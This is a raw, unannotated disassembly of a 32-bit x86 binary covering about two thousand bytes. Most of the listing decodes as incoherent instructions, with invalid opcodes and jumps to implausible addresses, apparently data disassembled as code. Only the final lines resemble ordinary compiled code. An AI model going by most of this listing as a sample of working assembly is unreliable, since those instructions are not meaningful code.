  40306c:	xor    BYTE PTR [edi+0x2e],0x23
  403070:	neg    BYTE PTR [ecx]
  403072:	mov    dl,0x99
  403074:	and    al,0x34
  403076:	push   cs
  403077:	sub    BYTE PTR [esi-0x19],cl
  40307a:	xor    BYTE PTR [esi-0x10bfe15f],bl
  403080:	push   ds
  403081:	mov    eax,ds:0x86dc00ff
  403086:	mov    DWORD PTR [ecx],ecx
  403088:	outs   dx,BYTE PTR ds:[esi]
  403089:	shl    BYTE PTR [ecx-0x45bd810],cl
  40308f:	mov    dh,0x47
  403091:	pop    ds
  403092:	and    eax,0x240054f0
  403097:	add    ebp,DWORD PTR [ebp-0x24db52bc]
  40309d:	pop    ecx
  40309e:	shl    DWORD PTR [edi+0x7e885ee4],1
  4030a4:	sub    al,0x8e
  4030a6:	outs   dx,BYTE PTR ds:[esi]
  4030a7:	sbb    cl,0x8e
  4030aa:	(bad)  
  4030ac:	ss repz jbe 0x4030e3
  4030b0:	fild   QWORD PTR ds:0x92a41aba
  4030b6:	mov    ebx,DWORD PTR [edx+0x53]
  4030b9:	add    ebx,eax
  4030bb:	pop    ecx
  4030bc:	cmp    eax,0xe5e07e53
  4030c1:	push   0x37
  4030c3:	or     eax,0xed31ccd8
  4030c8:	repnz cmp esi,DWORD PTR [ecx]
  4030cb:	inc    DWORD PTR [eax+0x62]
  4030ce:	shr    bl,1
  4030d0:	inc    esp
  4030d1:	addr16 xchg dl,dh
  4030d4:	pushf  
  4030d5:	aaa    
  4030d6:	cli    
  4030d7:	retf   0x638c
  4030da:	(bad)  [esi+0x24]
  4030dd:	inc    edi
  4030de:	xor    DWORD PTR [ebx],eax
  4030e0:	cmp    eax,0x2eb19152
  4030e5:	dec    ebx
  4030e6:	ret    0x66c6
  4030e9:	adc    ebx,DWORD PTR [ebx+0x61736088]
  4030ef:	jne    0x40309a
  4030f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030f2:	pop    ebx
  4030f3:	inc    esp
  4030f4:	mov    eax,DWORD PTR [eax-0x42]
  4030f7:	dec    esi
  4030f8:	add    BYTE PTR [ebx+eax*8],ah
  4030fb:	popw   ds
  4030fd:	xchg   BYTE PTR [edx+0x6a92f9c5],dh
  403103:	push   ss
  403104:	pop    edi
  403105:	aad    0x89
  403107:	push   eax
  403108:	push   ecx
  403109:	inc    eax
  40310a:	ins    BYTE PTR es:[edi],dx
  40310b:	adc    eax,0x5e9c0f36
  403110:	add    ch,bh
  403112:	mov    ebp,0x681342be
  403117:	test   eax,0xa1491381
  40311c:	lods   eax,DWORD PTR ds:[esi]
  40311d:	xchg   edi,eax
  40311e:	cli    
  40311f:	pop    es
  403120:	mov    bl,0x86
  403122:	lea    esp,[ebp-0x7d07b641]
  403128:	cmp    DWORD PTR [eax-0x634a7c54],ebx
  40312e:	cmc    
  40312f:	mov    esp,0xb5b423e
  403134:	cld    
  403135:	cmc    
  403136:	mov    ch,0x44
  403138:	retf   0x5559
  40313b:	mov    ss,WORD PTR [edx-0x30]
  40313e:	pop    ebx
  40313f:	ins    BYTE PTR es:[edi],dx
  403140:	ja     0x40314d
  403142:	mov    WORD PTR [esp+esi*4+0x57cf1b11],es
  403149:	outs   dx,BYTE PTR ds:[esi]
  40314a:	adc    ah,BYTE PTR [ecx-0x3beaff6c]
  403150:	mov    ah,0x6c
  403152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403153:	jno    0x4031d4
  403155:	sar    BYTE PTR [edi+0x39],0x88
  403159:	sbb    esp,edx
  40315b:	out    0xd2,eax
  40315d:	mov    dl,0x44
  40315f:	inc    ebx
  403160:	adc    bh,0xfb
  403163:	cwde   
  403164:	ss mov dh,0x1b
  403167:	shr    DWORD PTR [ecx+0x1ea380fb],cl
  40316d:	js     0x40310b
  40316f:	lods   eax,DWORD PTR ds:[esi]
  403170:	mov    ecx,0x6fa7c155
  403175:	(bad)  
  403176:	push   ebx
  403177:	aaa    
  403178:	pop    ss
  403179:	imul   edx,DWORD PTR [eax],0xffffff89
  40317c:	adc    BYTE PTR [ecx+ebx*8+0x5201f582],0x86
  403184:	aaa    
  403185:	mov    ah,0xd8
  403187:	arpl   WORD PTR [ebx-0x60],ax
  40318a:	scas   eax,DWORD PTR es:[edi]
  40318b:	cld    
  40318c:	dec    ebx
  40318d:	ret    
  40318e:	xor    DWORD PTR [edi+0x7215386f],esp
  403194:	loope  0x403140
  403196:	out    dx,al
  403197:	pop    edi
  403198:	outs   dx,BYTE PTR ds:[esi]
  403199:	ds clc 
  40319b:	repnz ror BYTE PTR [bx+di-0x55],1
  4031a0:	(bad)  
  4031a1:	cmp    eax,0x7f907e7c
  4031a6:	or     dl,bh
  4031a8:	pop    ds
  4031a9:	mov    esi,0xe996b326
  4031ae:	inc    ecx
  4031af:	mov    eax,0xa2a32a1e
  4031b4:	inc    ebp
  4031b5:	adc    eax,0x39b24b42
  4031ba:	retf   
  4031bb:	addr16 int 0xb
  4031be:	in     al,dx
  4031bf:	std    
  4031c0:	cmp    ecx,DWORD PTR [eax-0x35]
  4031c3:	fsubr  st(2),st
  4031c5:	lea    esi,[edx-0x3b]
  4031c8:	jno    0x403223
  4031ca:	pop    esi
  4031cb:	sbb    BYTE PTR [esi-0x29],cl
  4031ce:	jp     0x4031a3
  4031d0:	fs ret 0x703f
  4031d4:	rcl    DWORD PTR [ebx],cl
  4031d6:	and    al,0xeb
  4031d8:	mov    edx,0x35a10b98
  4031dd:	int    0x37
  4031df:	test   BYTE PTR [ebx],ch
  4031e1:	jno    0x403209
  4031e3:	cmp    DWORD PTR [edi-0x69dfb08e],ebp
  4031e9:	popf   
  4031ea:	jmp    DWORD PTR [esi-0x1d097abf]
  4031f0:	ret    0xce3d
  4031f3:	call   0xdfa6:0x53f09301
  4031fa:	ret    0x7fcb
  4031fd:	clc    
  4031fe:	push   esi
  4031ff:	pop    esi
  403200:	sub    al,0x76
  403202:	cmp    BYTE PTR [esi],bl
  403204:	popa   
  403205:	jle    0x403231
  403207:	xchg   esp,eax
  403208:	daa    
  403209:	xchg   BYTE PTR [ebx+0x49],bh
  40320c:	mov    WORD PTR [eax+0x2c3f12a2],fs
  403212:	push   0x59b1ed6c
  403217:	push   ss
  403218:	add    DWORD PTR [edi-0x73e409a4],eax
  40321e:	imul   edi,ebx,0x20ddf4bb
  403224:	mov    DWORD PTR [ecx],0x5d3a7da3
  40322a:	scas   eax,DWORD PTR es:[edi]
  40322b:	pop    ebp
  40322c:	xor    edx,DWORD PTR [eax+eiz*2-0xb4dedb6]
  403233:	stc    
  403234:	adc    al,0xe0
  403236:	loope  0x40326e
  403238:	fisubr DWORD PTR [edx]
  40323a:	addr16 sub al,0xe2
  40323d:	xor    esi,DWORD PTR [esi-0x22]
  403240:	loope  0x4031d1
  403242:	int3   
  403243:	adc    BYTE PTR [esi+0x46],0x7b
  403247:	xchg   ebx,eax
  403248:	addr16 sub eax,0x9c22bd02
  40324e:	ins    DWORD PTR es:[edi],dx
  40324f:	pop    esi
  403251:	rol    DWORD PTR [eax+0x22c23120],1
  403257:	idiv   BYTE PTR [edx]
  403259:	push   0xe18adf48
  40325e:	jp     0x4032c9
  403260:	mov    eax,0x3f5151f4
  403265:	jns    0x403275
  403267:	and    eax,0xdc290c04
  40326c:	xchg   esp,eax
  40326d:	and    BYTE PTR [esi-0x63],bl
  403270:	jge    0x4032a0
  403272:	mov    al,ds:0x3e3e57db
  403277:	cmp    edx,DWORD PTR [edi-0x3bdffb4a]
  40327d:	xchg   esp,eax
  40327e:	adc    al,0x7c
  403280:	sbb    BYTE PTR [eax],ah
  403282:	mov    cl,0x3c
  403284:	cld    
  403285:	leave  
  403286:	xchg   DWORD PTR [ecx+0x575a0e83],edx
  40328c:	pop    edi
  40328d:	inc    edi
  40328e:	xchg   DWORD PTR [edx],edx
  403290:	retf   
  403291:	sub    edx,DWORD PTR [esi+0x672a3f6e]
  403297:	and    DWORD PTR [ebx],0xf
  40329a:	out    dx,al
  40329b:	jmp    0x245e16e2
  4032a0:	xchg   DWORD PTR [esi-0xa],ecx
  4032a3:	pop    ss
  4032a4:	(bad)  
  4032a5:	cmp    ebp,DWORD PTR [ebx+0x56]
  4032a8:	and    cl,BYTE PTR [ecx-0xca0e1f]
  4032ae:	int    0x92
  4032b0:	(bad)  
  4032b1:	lods   eax,DWORD PTR ds:[esi]
  4032b2:	jae    0x4032e2
  4032b4:	jno    0x4032d7
  4032b6:	mov    ds:0x790404e8,eax
  4032bb:	fs dec esi
  4032bd:	xor    al,0xba
  4032bf:	sub    DWORD PTR [esp+edx*4+0x4c916400],0x4d
  4032c7:	push   ss
  4032c8:	sub    bh,BYTE PTR ds:0xac80db23
  4032ce:	jnp    0x40327d
  4032d0:	pop    eax
  4032d1:	add    eax,0x443ca17f
  4032d6:	das    
  4032d7:	stos   BYTE PTR es:[edi],al
  4032d8:	mov    esi,0xca499bb8
  4032dd:	mov    al,ds:0xdccbc753
  4032e2:	loopne 0x403301
  4032e4:	push   ss
  4032e5:	inc    eax
  4032e6:	xor    bl,BYTE PTR [ecx-0xb]
  4032e9:	lock outs dx,BYTE PTR ds:[esi]
  4032eb:	jge    0x403352
  4032ed:	dec    ecx
  4032ee:	push   0xfffffff9
  4032f0:	(bad)
  4032f3:	fdivr  DWORD PTR [edi+0x5b8af99e]
  4032f9:	cmp    DWORD PTR [ebx+0x77],0x5c
  4032fd:	and    cl,BYTE PTR [eax-0x44c1e59b]
  403303:	sbb    DWORD PTR [ebx],eax
  403305:	add    eax,DWORD PTR [edi+edx*8-0x4a5faa9f]
  40330c:	push   ecx
  40330d:	or     eax,0x41eec40a
  403312:	push   eax
  403313:	cli    
  403314:	push   cs
  403315:	mov    dh,0x1d
  403317:	sbb    DWORD PTR ss:[ebx-0x73ff5e7a],ebp
  40331e:	push   ds
  40331f:	in     eax,0x8f
  403321:	loope  0x40336f
  403323:	in     al,0x9e
  403325:	je     0x4032fc
  403327:	dec    eax
  403328:	and    DWORD PTR [edx+0x5a],ebp
  40332b:	nop
  40332c:	adc    BYTE PTR [edi],dl
  40332e:	jo     0x4032e9
  403330:	adc    BYTE PTR [ebx+ebx*4+0x66672a52],0xb1
  403338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403339:	jmp    0x24487c6b
  40333e:	shl    BYTE PTR [esp+edx*1-0x18],0x77
  403343:	cmp    bh,BYTE PTR [edx]
  403345:	retf   0x2310
  403348:	arpl   WORD PTR [eax],bx
  40334a:	popf   
  40334b:	out    dx,al
  40334c:	popa   
  40334d:	xchg   esp,eax
  40334e:	fs xchg esi,eax
  403350:	jg     0x403341
  403352:	fsubr  QWORD PTR [ebx-0x6e]
  403355:	das    
  403356:	out    dx,al
  403357:	rcl    DWORD PTR [esp+ebp*2+0x5f9a608b],1
  40335e:	jp     0x4033da
  403360:	and    DWORD PTR [edx-0x1a2f3929],ebx
  403366:	dec    edx
  403367:	popf   
  403368:	(bad)  
  403369:	inc    ecx
  40336a:	pusha  
  40336b:	fistp  DWORD PTR [ecx-0x1e4f6c31]
  403371:	xor    al,0x9b
  403373:	inc    esi
  403374:	sbb    DWORD PTR [edi+edx*1],ebx
  403377:	mov    ah,0x8d
  403379:	shl    DWORD PTR [edx],0x8a
  40337c:	leave  
  40337d:	retf   0x17b4
  403380:	xchg   edi,eax
  403381:	lds    esp,FWORD PTR [esp+edi*2+0x21]
  403385:	pop    edi
  403386:	shr    BYTE PTR [ebp+0x76],0xb7
  40338a:	popa   
  40338b:	mov    esi,0x6584d8af
  403390:	inc    ebx
  403391:	or     ecx,DWORD PTR [ebx+0x66]
  403394:	dec    ecx
  403395:	cld    
  403396:	test   DWORD PTR [ebx],0x3b71188e
  40339c:	add    DWORD PTR [ebp+0xb492601],ebx
  4033a2:	hlt    
  4033a3:	sub    ecx,DWORD PTR [eax+0xd]
  4033a6:	fsubr  st(6),st
  4033a8:	add    edi,DWORD PTR [edx+0x485caaf5]
  4033ae:	pop    ss
  4033af:	pop    ebp
  4033b0:	cli    
  4033b1:	push   ecx
  4033b2:	xchg   esi,eax
  4033b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033b4:	xchg   ebx,eax
  4033b5:	popf   
  4033b6:	jmp    0x403362
  4033b8:	imul   edi,DWORD PTR [edx+0x6bba7e88],0x1c
  4033bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033c0:	(bad)  
  4033c1:	mov    ebx,0x18ceab96
  4033c6:	ror    BYTE PTR [edi-0x7a6413f6],0xce
  4033cd:	adc    eax,0x5d4fb1e
  4033d2:	(bad)  
  4033d3:	mov    ds:0x877dc58f,al
  4033d8:	das    
  4033d9:	mov    ebp,0xf2f025e2
  4033de:	and    eax,0x53120ce2
  4033e3:	push   edx
  4033e4:	and    BYTE PTR [ebp-0x2ba37324],al
  4033ea:	test   ah,0xad
  4033ed:	adc    al,0xa6
  4033ef:	push   eax
  4033f0:	xchg   ebx,eax
  4033f1:	inc    edx
  4033f2:	jmp    0xec57796d
  4033f7:	dec    edx
  4033f8:	out    dx,eax
  4033f9:	fild   WORD PTR [esi]
  4033fb:	cmc    
  4033fc:	(bad)  
  4033fd:	mov    ecx,0x38ff1d51
  403402:	mov    dl,0x87
  403404:	das    
  403405:	push   0x2f
  403407:	int3   
  403408:	mov    esp,ebx
  40340a:	sub    ah,BYTE PTR [edi-0x632dfd]
  403410:	sub    eax,eax
  403412:	sub    BYTE PTR [ebx+0x6f],ah
  403415:	pop    edi
  403416:	enter  0xc1ba,0x3e
  40341a:	lock mov ?,WORD PTR [edx+0x37]
  40341e:	dec    edx
  40341f:	sub    eax,0x6a856c7c
  403424:	into   
  403425:	in     al,dx
  403426:	sbb    BYTE PTR [eax],ch
  403428:	mov    ch,0xdf
  40342a:	push   esi
  40342b:	inc    edi
  40342c:	(bad)  
  40342d:	cmp    al,0x4c
  40342f:	mov    cl,0xa5
  403431:	(bad)  
  403432:	outs   dx,BYTE PTR ds:[esi]
  403433:	xchg   esp,eax
  403434:	dec    eax
  403435:	in     eax,dx
  403436:	mov    edi,0x8f1e2c63
  40343b:	jl     0x40345c
  40343d:	mov    esi,0x4e1f7fa4
  403442:	pop    ebp
  403443:	push   ebx
  403444:	lods   al,BYTE PTR ds:[esi]
  403445:	in     al,dx
  403446:	lea    edi,[esp+eax*8-0x80]
  40344a:	test   DWORD PTR [esi-0x56],ecx
  40344d:	jo     0x40341e
  40344f:	imul   ebp,DWORD PTR [edx],0xadac07e0
  403455:	add    dh,BYTE PTR [edx+0x41]
  403458:	jge    0x40340c
  40345a:	lods   al,BYTE PTR ds:[esi]
  40345b:	xchg   ebx,eax
  40345c:	push   eax
  40345d:	int    0x2e
  40345f:	inc    DWORD PTR [eax+0x6e]
  403462:	out    0xe2,al
  403464:	or     DWORD PTR [esi+ecx*1+0x74],edx
  403468:	call   0xea:0xcfd10f48
  40346f:	hlt    
  403470:	adc    al,0xf9
  403472:	fsubr  QWORD PTR [edi+edi*1-0x17]
  403476:	(bad)  
  403477:	ja     0x4034ea
  403479:	lahf   
  40347a:	dec    edi
  40347b:	mov    ds:0x4268341,al
  403480:	sahf   
  403481:	xchg   esp,eax
  403482:	dec    ecx
  403483:	in     eax,dx
  403484:	mov    DWORD PTR [ebx+0x182caf93],eax
  40348a:	cld    
  40348b:	std    
  40348c:	loope  0x4034b0
  40348e:	(bad)  
  40348f:	mov    esi,0x5abba123
  403494:	adc    ebp,DWORD PTR [eax-0x65]
  403497:	lods   eax,DWORD PTR ds:[esi]
  403498:	mov    ebp,0xfddc933
  40349d:	cmp    dh,BYTE PTR [ecx]
  40349f:	xor    bh,BYTE PTR [edx+0x6a]
  4034a2:	cmp    al,0xa4
  4034a4:	scas   eax,DWORD PTR es:[edi]
  4034a5:	sbb    bl,BYTE PTR [ebp-0x14]
  4034a8:	int    0x7
  4034aa:	mov    al,ds:0x2437cf6a
  4034af:	data16 and BYTE PTR [edi],bh
  4034b2:	mov    ch,BYTE PTR [eax]
  4034b4:	push   esi
  4034b5:	outs   dx,BYTE PTR ds:[esi]
  4034b6:	xchg   esp,eax
  4034b7:	xchg   ebx,eax
  4034b8:	das    
  4034b9:	call   DWORD PTR [esi+0x7b]
  4034bc:	scas   eax,DWORD PTR es:[edi]
  4034bd:	mov    ch,0x6c
  4034bf:	out    dx,al
  4034c0:	push   esp
  4034c1:	test   BYTE PTR [esp+ebx*1],ch
  4034c4:	push   cs
  4034c5:	sbb    al,0x73
  4034c7:	fdiv   QWORD PTR [ecx+0x2a743c21]
  4034cd:	out    0xc0,al
  4034cf:	jo     0x403482
  4034d1:	loop   0x40350e
  4034d3:	ret    
  4034d4:	std    
  4034d5:	xor    esi,eax
  4034d7:	loopne 0x4034a6
  4034d9:	add    DWORD PTR [ebp-0x54],ebp
  4034dc:	ins    DWORD PTR es:[edi],dx
  4034dd:	xor    al,0x43
  4034df:	outs   dx,BYTE PTR ds:[esi]
  4034e0:	inc    esi
  4034e2:	pop    es
  4034e3:	leave  
  4034e4:	mov    dh,0xdf
  4034e6:	jmp    0xbdca85f1
  4034eb:	bound  ebx,QWORD PTR [esi+0x192f580d]
  4034f1:	dec    ebp
  4034f2:	pop    esp
  4034f3:	inc    esp
  4034f4:	popf   
  4034f5:	jp     0x40351a
  4034f7:	and    BYTE PTR [ecx-0x5e],0xaa
  4034fb:	stos   DWORD PTR es:[edi],eax
  4034fc:	fstp   TBYTE PTR [ecx-0x7302dd66]
  403502:	xor    esp,DWORD PTR [ebx+0x79]
  403505:	sub    ecx,DWORD PTR [ebp-0x59]
  403508:	jge    0x4034ec
  40350a:	add    dh,ch
  40350c:	lock pop esp
  40350e:	push   ebp
  40350f:	shr    DWORD PTR [ebx-0x7e],1
  403512:	or     BYTE PTR [edi+ebp*2],cl
  403515:	call   FWORD PTR [eax-0x42e2d0fd]
  40351b:	repz les ebp,FWORD PTR [edx+0x15236d57]
  403522:	retf   
  403523:	pop    edx
  403524:	mov    bl,0x4a
  403526:	popa   
  403527:	clc    
  403528:	(bad)  
  403529:	in     eax,0x1b
  40352b:	repz sub BYTE PTR [edi],dl
  40352e:	sahf   
  40352f:	jmp    0xbab:0x22984a76
  403536:	fdivr  QWORD PTR [edi+0x6a2ead4]
  40353c:	pop    ss
  40353d:	hlt    
  40353e:	aad    0xa5
  403540:	pop    eax
  403541:	dec    ebp
  403542:	daa    
  403543:	xor    al,0x1a
  403545:	out    dx,eax
  403546:	sub    DWORD PTR [ebp+0x74af8f89],eax
  40354c:	mov    edx,0xc00f973b
  403551:	(bad)  
  403552:	jle    0x4034fa
  403554:	inc    edi
  403555:	mov    ds:0xf093a0ea,al
  40355a:	sar    BYTE PTR [ebx+0x59b4a516],0x60
  403561:	adc    BYTE PTR [ebx-0x23],dl
  403564:	sub    al,0xee
  403566:	scas   eax,DWORD PTR es:[edi]
  403567:	cmp    esp,DWORD PTR [ecx]
  403569:	add    al,bh
  40356b:	push   ss
  40356c:	push   0x1b5d2313
  403571:	inc    esi
  403572:	mov    ah,0x35
  403574:	push   es
  403575:	add    eax,0x11ef4ebd
  40357a:	add    BYTE PTR [edi],al
  40357c:	or     DWORD PTR [ebx],edi
  40357e:	jp     0x4035c9
  403580:	inc    edx
  403581:	cmc    
  403582:	jne    0x40350d
  403584:	(bad)  
  403585:	cs scas al,BYTE PTR es:[edi]
  403587:	inc    esp
  403588:	mov    ebp,0x81f12f51
  40358d:	and    ebp,esi
  40358f:	ficom  DWORD PTR [esi+ecx*1-0x31]
  403593:	sub    BYTE PTR [ecx-0x4c],0xa3
  403597:	(bad)  
  403598:	jmp    0x40351e
  40359a:	sahf   
  40359b:	enter  0x33db,0xde
  40359f:	ds xchg esi,eax
  4035a1:	jno    0x40352e
  4035a3:	or     ebp,esp
  4035a5:	xchg   ecx,eax
  4035a6:	stc    
  4035a7:	xchg   ebp,eax
  4035a8:	xor    BYTE PTR [edi-0x51db28e2],ah
  4035ae:	mov    DWORD PTR [edi+0x17ec14d4],edi
  4035b4:	push   ecx
  4035b5:	hlt    
  4035b6:	sar    BYTE PTR [eax+0x15ee6a03],0x26
  4035bd:	push   esp
  4035be:	in     al,dx
  4035bf:	(bad)  
  4035c0:	aas    
  4035c1:	inc    edi
  4035c2:	mov    al,0x45
  4035c4:	sub    eax,0x9fd35acb
  4035c9:	cmp    BYTE PTR [edx+0x7e247c1f],0x57
  4035d0:	ss enter 0xe41a,0x10
  4035d5:	int3   
  4035d6:	retf   
  4035d7:	cmp    cl,bl
  4035d9:	lahf   
  4035da:	nop
  4035db:	jmp    0x1d8e8524
  4035e0:	fcomp  QWORD PTR ds:[ebp+0xa130134]
  4035e7:	xor    eax,0xf365ce1c
  4035ec:	mov    ebx,0x756df5a7
  4035f1:	fdivr  QWORD PTR [ebp+0x3e05f46a]
  4035f7:	xor    al,BYTE PTR [esi+0x6b]
  4035fa:	idiv   DWORD PTR [eax+0x252bb60c]
  403600:	xlat   BYTE PTR ds:[ebx]
  403601:	dec    edx
  403602:	sub    bh,BYTE PTR [esi]
  403604:	and    DWORD PTR [edx+edi*4],eax
  403607:	(bad)  
  403609:	jge    0x403618
  40360b:	jge    0x4035cc
  40360d:	(bad)  
  40360e:	std    
  40360f:	jmp    0x24ce9c4c
  403614:	mov    edx,eax
  403616:	jns    0x403683
  403618:	test   al,0xeb
  40361a:	int    0xad
  40361c:	cmp    ebx,0x50
  40361f:	sbb    BYTE PTR [ecx-0x16],bh
  403622:	mov    DWORD PTR [eax],eax
  403624:	fisubr WORD PTR [ebx]
  403626:	mov    bh,0xa1
  403628:	cmp    ebx,DWORD PTR [edx]
  40362a:	retf   0x4a0c
  40362d:	mov    cl,0xc2
  40362f:	(bad)  
  403631:	mov    edx,DWORD PTR [ebp-0x111710e1]
  403637:	dec    esp
  403638:	ror    BYTE PTR [eax],1
  40363a:	inc    esp
  40363b:	aad    0x3a
  40363d:	mov    cl,0x73
  40363f:	frstor [esi+eiz*4-0x6d]
  403643:	add    al,0x2b
  403645:	jecxz  0x4036c5
  403647:	adc    BYTE PTR [eax+0xa],0x7
  40364b:	xchg   ecx,eax
  40364c:	lock imul ebp,DWORD PTR [ebp+0x78],0x38e58cce
  403654:	mov    DWORD PTR [ecx-0x3df22b85],esp
  40365a:	int3   
  40365b:	lods   eax,DWORD PTR ds:[esi]
  40365c:	mov    ah,0x90
  40365e:	aaa    
  40365f:	jns    0x4036d2
  403661:	jnp    0x4035ea
  403663:	xor    edi,DWORD PTR es:[edi+eiz*2]
  403667:	mov    gs,WORD PTR [esi]
  403669:	(bad)  
  40366a:	int    0xdf
  40366c:	xor    ebx,DWORD PTR [edx-0x3612999e]
  403672:	lods   al,BYTE PTR ds:[esi]
  403673:	mov    ds:0x6010ca5a,eax
  403678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403679:	(bad)  
  40367b:	pop    eax
  40367c:	dec    esi
  40367d:	hlt    
  40367e:	sub    al,0x1e
  403680:	mov    cl,0x5
  403682:	pusha  
  403683:	mov    ch,0x58
  403685:	lds    ebp,FWORD PTR [edx+0xb]
  403688:	pop    ecx
  403689:	sub    ecx,DWORD PTR [ebx+edx*8+0x1ab86a4a]
  403690:	mov    ebp,DWORD PTR [edx-0x63]
  403693:	cmp    DWORD PTR ds:0xf8765950,ecx
  403699:	xor    dl,BYTE PTR [edi]
  40369b:	repz xchg edi,ecx
  40369e:	mov    bh,0xef
  4036a0:	inc    edx
  4036a1:	(bad)  
  4036a2:	nop
  4036a3:	mov    ds:0x5ce0a649,al
  4036a8:	fdivr  QWORD PTR [eax*8+0x79dca18d]
  4036af:	in     al,0xa0
  4036b1:	arpl   WORD PTR [ebx+eax*2-0x73a70cfb],ax
  4036b8:	xchg   esi,eax
  4036b9:	sbb    esp,eax
  4036bb:	jle    0x40371f
  4036bd:	mov    esp,0xb4133f2c
  4036c2:	pop    ss
  4036c3:	ret    0xf0ee
  4036c6:	les    ecx,FWORD PTR [ecx+0x5e]
  4036c9:	mov    edi,0x2c17484f
  4036ce:	(bad)  
  4036cf:	in     al,dx
  4036d0:	fmulp  st(7),st
  4036d2:	les    esi,FWORD PTR [edx-0x4ec7b776]
  4036d8:	xchg   edx,eax
  4036d9:	idiv   ch
  4036db:	push   edi
  4036dc:	je     0x40371b
  4036de:	fild   WORD PTR [eax-0x30]
  4036e1:	out    0x2d,al
  4036e3:	je     0x403734
  4036e5:	mov    al,ds:0x749aa7b9
  4036ea:	pop    cx
  4036ec:	adc    al,BYTE PTR [ebx+0x6a]
  4036ef:	pop    esi
  4036f0:	dec    edx
  4036f1:	adc    ebp,DWORD PTR [eax+esi*8]
  4036f4:	ss mov edi,0x2af02649
  4036fa:	sub    cl,BYTE PTR [ebx]
  4036fc:	test   BYTE PTR [ebx],bh
  4036fe:	pop    ds
  4036ff:	cli    
  403700:	(bad)  
  403701:	fld    TBYTE PTR [ebp-0x69]
  403704:	mov    ebp,0x839a4476
  403709:	adc    eax,DWORD PTR [ecx]
  40370b:	jns    0x403696
  40370d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40370e:	xor    ebp,ebx
  403710:	dec    edx
  403711:	and    BYTE PTR [edx-0x787cf374],dh
  403717:	leave  
  403718:	sub    BYTE PTR [edx-0x20],bh
  40371b:	cli    
  40371c:	test   eax,0xc69d3e5a
  403721:	xchg   ebx,eax
  403722:	loopne 0x40376e
  403724:	(bad)  [ecx+0x73b587ea]
  40372a:	push   esi
  40372b:	sub    BYTE PTR [esi+ebp*8-0x649d640],ah
  403732:	test   BYTE PTR [ebp+0x6f24b30b],bl
  403738:	out    0x54,al
  40373a:	push   es
  40373b:	leave  
  40373c:	jp     0x4036e5
  40373e:	mov    ebp,0x90572d73
  403743:	loope  0x403756
  403745:	push   ecx
  403746:	int3   
  403747:	add    al,0x74
  403749:	lock call 0x1226:0xd2ddc123
  403751:	sub    BYTE PTR [ebx-0x24],0x8e
  403755:	jae    0x403731
  403757:	xchg   edi,eax
  403758:	adc    DWORD PTR [edi+0x52f79b9e],esp
  40375e:	inc    ebx
  40375f:	jmp    0xc285:0xe8324f32
  403766:	jecxz  0x4036fe
  403768:	stc    
  403769:	mov    ebx,0x48bdff90
  40376e:	aas    
  40376f:	push   cs
  403770:	push   es
  403771:	mov    DWORD PTR [eax+0x6a],edi
  403774:	dec    ecx
  403775:	sbb    BYTE PTR ds:[ecx-0x54],ch
  403779:	imul   DWORD PTR ds:0xdfc39d15
  40377f:	cs (bad) 
  403781:	sbb    ecx,DWORD PTR [ebx+ebx*2+0x3a]
  403785:	rcl    bl,cl
  403787:	clc    
  403788:	xchg   esi,eax
  403789:	test   BYTE PTR [ecx],ch
  40378b:	add    ch,BYTE PTR [ecx+0x590b285]
  403791:	xor    DWORD PTR [edx],ebx
  403793:	loopne 0x403810
  403795:	call   esi
  403797:	xlat   BYTE PTR ds:[ebx]
  403798:	rol    DWORD PTR [edx+0x74c4fe7a],1
  40379e:	jmp    0x403800
  4037a0:	test   al,0xdf
  4037a2:	sub    al,0x3
  4037a4:	ins    BYTE PTR es:[edi],dx
  4037a5:	cs nop
  4037a7:	cdq    
  4037a8:	pop    ebx
  4037a9:	mov    cl,0x16
  4037ab:	xchg   BYTE PTR [edx-0x241b5f4a],cl
  4037b1:	add    al,BYTE PTR [ebp+0x27]
  4037b4:	loope  0x403756
  4037b6:	jle    0x403785
  4037b8:	lahf   
  4037b9:	out    0xd0,eax
  4037bb:	mov    ebx,0x5235f643
  4037c0:	add    dl,BYTE PTR [esi]
  4037c2:	pop    edx
  4037c3:	adc    ebp,esp
  4037c5:	bnd jmp 0x403833
  4037c8:	cs xchg ebp,eax
  4037ca:	mov    WORD PTR [edx+0x4ef521f6],gs
  4037d0:	push   edx
  4037d1:	loop   0x4037d3
  4037d3:	xchg   edi,eax
  4037d4:	daa    
  4037d5:	jnp    0x403808
  4037d7:	in     eax,dx
  4037d8:	xchg   esp,eax
  4037d9:	retf   
  4037da:	xchg   esp,eax
  4037db:	sub    BYTE PTR [ebx],al
  4037dd:	loope  0x403816
  4037df:	fst    DWORD PTR ds:0x98f747b6
  4037e5:	inc    ebx
  4037e6:	lods   al,BYTE PTR ds:[esi]
  4037e7:	jmp    0xdfdb:0x2a57bc1e
  4037ee:	call   0x41ae62
  4037f3:	test   eax,eax
  4037f5:	je     0x403826
  4037fb:	lea    eax,[ebp-0x90]
  403801:	push   eax
  403802:	mov    eax,DWORD PTR [ebp-0x30]
  403805:	xor    eax,esi
  403807:	add    eax,edi
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
